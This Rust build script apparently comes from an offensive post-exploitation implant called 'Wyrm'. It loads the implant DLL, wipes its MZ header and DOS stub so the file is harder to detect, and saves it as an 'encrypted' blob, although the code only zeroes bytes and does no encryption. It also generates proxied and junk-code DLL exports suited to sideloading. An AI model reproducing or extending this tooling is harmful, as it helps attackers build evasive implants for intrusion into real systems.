use std::{
    env,
    fmt::Write,
    fs::{self, File},
    io::Read,
    path::{Path, PathBuf},
};

fn main() {
    let envs = &[
        //     // "EXPORTS_JMP_WYRM",
        //     // "EXPORTS_USR_MACHINE_CODE",
        //     // "EXPORTS_PROXY",
        //     // // TODO
        "DLL_PATH",
    ];

    for key in envs {
        println!("cargo:rerun-if-env-changed={key}");
    }

    for var in envs {
        if let Ok(val) = env::var(var) {
            println!("cargo:rustc-env={var}={val}");
        }
    }

    prepare_wyrm_dll();
    // write_exports_to_build_dir();
}

/// Reads and encrypts the post-ex Wyrm DLL
fn prepare_wyrm_dll() {
    let buf = if let Some(path) = option_env!("DLL_PATH") {
        let path = PathBuf::from(path);
        let mut f = File::open(path).unwrap();
        let mut buf = Vec::with_capacity(f.metadata().unwrap().len() as usize);
        f.read_to_end(&mut buf).unwrap();

        // overwrite the MZ header but keeping the e_lfanew
        const MAX_OVERWRITE_END: usize = 50;
        buf[0..MAX_OVERWRITE_END].fill(0);

        // overwrite the THIS PROGRAM CANNOT BE RUN IN DOS MODE...
        const RANGE_START: usize = 0x4E;
        const RANGE_END: usize = 0x73;
        buf[RANGE_START..RANGE_END].fill(0);

        buf
    } else {
        vec![]
    };

    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    // TODO take the test path profile name and append
    let dest_path = Path::new(&out_dir).join("rdll_encrypted.bin");
    fs::write(dest_path, buf).unwrap();
}

/// Writes exported symbols to the binary, whether genuine exports or proxied ones.
fn write_exports_to_build_dir() {
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("custom_exports.rs");
    let mut code = String::new();

    // let stage = env::var("STAGE_TYPE").unwrap_or_default();
    // If we are not a DLL, write an empty file so the compiler is happy
    // if stage.to_lowercase() != "dll" {
    //     fs::write(dest, String::new()).unwrap();
    //     return;
    // };

    let exports_usr_machine_code = env::var("EXPORTS_USR_MACHINE_CODE").ok();
    let exports_proxy = env::var("EXPORTS_PROXY").ok();
    let exports_jmp_wyrm = env::var("EXPORTS_JMP_WYRM").ok();

    if let Some(export_str) = exports_jmp_wyrm {
        if export_str.is_empty() {
            // If there was no custom export defined, then we just export the 'run' extern
            writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
        }

        for fn_name in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            writeln!(
                &mut code,
                "build_dll_export_by_name_start_wyrm!({fn_name});",
            )
            .unwrap();
        }
    } else {
        // Just in case.. we still need an entrypoint, tho this should never run
        writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
    }

    if let Some(export_str) = exports_usr_machine_code {
        for item in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            let mut parts = item.split('=');
            let name = parts.next().unwrap().trim();
            let bytes = parts.next().unwrap_or("").trim();

            assert!(!name.is_empty());
            assert!(!bytes.is_empty());

            writeln!(
                &mut code,
                "build_dll_export_by_name_junk_machine_code!({name}, {bytes});",
            )
            .unwrap();
        }
    }

    if let Some(exports) = exports_proxy {
        for item in exports
            .split(';')
            .map(|s| s.trim())
            .filter(|s| !s.is_empty() && s.is_ascii())
        {
            println!("cargo:rustc-link-arg=/export:{item}");
        }
    }

    // We still need to write in the case of nothing so that we dont get include
    // errors
    fs::write(dest, code).unwrap();
}
